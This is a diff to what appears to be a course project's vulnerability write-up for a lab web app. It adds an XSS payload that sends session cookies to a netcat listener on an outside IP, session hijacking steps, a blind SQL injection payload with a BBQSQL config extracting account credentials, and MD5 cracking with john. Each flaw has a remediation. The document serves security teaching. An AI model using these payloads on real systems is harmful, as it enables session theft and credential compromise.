@@ -26,11 +26,19 @@ TODO
 
 **Steps to reproduce**:
 
-1. s1
-2. s2
-3. s3
+1. Go to the sign up form to create a new user.
+2. In the address field insert:
+    ```
+    <script>document.write('<img src="http://192.168.0.117:1234/' + document.cookie + '">')</script>
+    ```
+3. Start a netcat server using the command `nc -lp 1234`. When a user opens the attendees page, a request is sent to this server:
+    ![Result of XSS](https://raw.githubusercontent.com/BenjaminStienlet/cybersecuritybase-project/master/images/XSS_session_cookie.png)
+4. We now can take over the session of this user by changing our own session cookie using `document.cookie="JSESSIONID=E0ED84B16865028DF09E522DC8B8DDC8"` in the browser console. This way we are able to steal the session of the admin user when this user logs in.
 
 **Remediation**:
+
+* Escape user input when showing this on a page.
+* Make sure that the HTTPOnly cookie flag is set for the session ID.
 
 
 ## Flaw 3 - Cross-Site Request Forgery
@@ -61,8 +69,9 @@ TODO
     ```
     1' OR (ASCII(SUBSTRING(SELECT CONCAT(NAME,':',PASSWORD) FROM ACCOUNT LIMIT 1 OFFSET 1, 1, 1)) > 63) --
     ```
+
     If the list of attendees is shown, the query evaluated to true and the ASCII value first character in the Name column for the first row in the Account table is larger than 63. If no attendees are shown, then the query evaluated to false.
-5. We can now execute this base query using the tool [BBQSQL](https://github.com/Neohapsis/bbqsql) using the following configuration file:
+5. We can now execute this base query using the tool [BBQSQL](https://github.com/Neohapsis/bbqsql) with the following configuration file:
     ```
     [Request Config]
     url = http://192.168.0.185:8080/attendees
@@ -82,7 +91,8 @@ TODO
     ![Result of BBQSQL](https://raw.githubusercontent.com/BenjaminStienlet/cybersecuritybase-project/master/images/SQLI_result.png)
 
 **Remediation**:
-[Parameterized queries](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet#Defense_Option_1:_Prepared_Statements_.28with_Parameterized_Queries.29) can be used as a remediation for this SQL injection.
+
+* [Parameterized queries](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet#Defense_Option_1:_Prepared_Statements_.28with_Parameterized_Queries.29) can be used as a remediation for this SQL injection.
 
 
 ## Flaw 5 - Sensitive Data Exposure
@@ -95,8 +105,10 @@ TODO
 1. In the previous flaw, we found the user names and hashes of the passwords. Using an [online tool](https://www.onlinehashcrack.com/hash-identification.php) to identify the hash type, we can see that these hashes are probably MD5 hashes.
 2. We can try to crack the hashes using the tool 'john the ripper' with the command `john -format=raw-MD5 bbqsql_output.csv`:
     ![Result of john](https://raw.githubusercontent.com/BenjaminStienlet/cybersecuritybase-project/master/images/SQLI_result.png)
+
     We could also check an [online reverse lookup](http://md5.gromweb.com/) for the MD5 hashes:
     ![Result of reverse lookup](https://raw.githubusercontent.com/BenjaminStienlet/cybersecuritybase-project/master/images/MD5_reverse_lookup.png)
 
 **Remediation**:
-Select a hashing algorithm that has no known vulnerabilities. For example the standard BCrypt algorithm in the Spring framework. The implementation in Spring also uses a random salt per user.
+
+* Select a hashing algorithm that has no known vulnerabilities. For example the standard BCrypt algorithm in the Spring framework. The implementation in Spring also uses a random salt per user.
